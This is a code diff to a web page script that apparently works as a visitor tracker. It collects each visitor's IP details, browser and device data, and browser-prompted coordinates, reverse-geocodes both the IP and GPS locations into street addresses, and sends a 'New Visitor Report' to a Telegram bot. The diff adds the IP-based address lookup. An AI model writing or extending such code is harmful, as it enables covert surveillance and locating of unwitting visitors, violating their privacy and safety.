@@ -39,6 +39,16 @@
       return await res.json();
     }
 
+    async function reverseGeocode(lat, lon) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+        const data = await res.json();
+        return data.display_name || 'Unknown location';
+      } catch {
+        return 'Lookup failed';
+      }
+    }
+
     function getBrowserInfo() {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
@@ -76,15 +86,7 @@
           async pos => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-
-            let address = 'N/A';
-            try {
-              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
-              const data = await res.json();
-              address = data.display_name || 'Unknown location';
-            } catch (e) {
-              address = 'Lookup failed';
-            }
+            const address = await reverseGeocode(lat, lon);
 
             resolve({
               allowed: true,
@@ -99,7 +101,7 @@
       });
     }
 
-    function buildMessage(ipData, browserData, geoData) {
+    function buildMessage(ipData, ipAddress, ipAddressResolved, browserData, geoData) {
       return `📡 *New Visitor Report*
 
 🌐 *Browser Info*
@@ -110,7 +112,7 @@
 - Device Type: ${browserData.deviceType}
 - Current Time: ${browserData.time}
 
-📍 *IP Info*
+📍 *IP-Based Location*
 - IP: ${ipData.ip}
 - Country: ${ipData.country_name}
 - Region: ${ipData.region}
@@ -122,6 +124,7 @@
 - TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
 - Latitude: ${ipData.latitude}
 - Longitude: ${ipData.longitude}
+- Address: ${ipAddressResolved}
 
 📌 *Geo Prompt Location*
 - Status: ${geoData.allowed ? 'Allowed' : 'Denied'}
@@ -140,8 +143,9 @@
           getGeoPrompt()
         ]);
 
+        const ipAddressResolved = await reverseGeocode(ipData.latitude, ipData.longitude);
         const browserData = getBrowserInfo();
-        const message = buildMessage(ipData, browserData, geoData);
+        const message = buildMessage(ipData, ip, ipAddressResolved, browserData, geoData);
 
         sendTelegramMessage(message);
       } catch (err) {
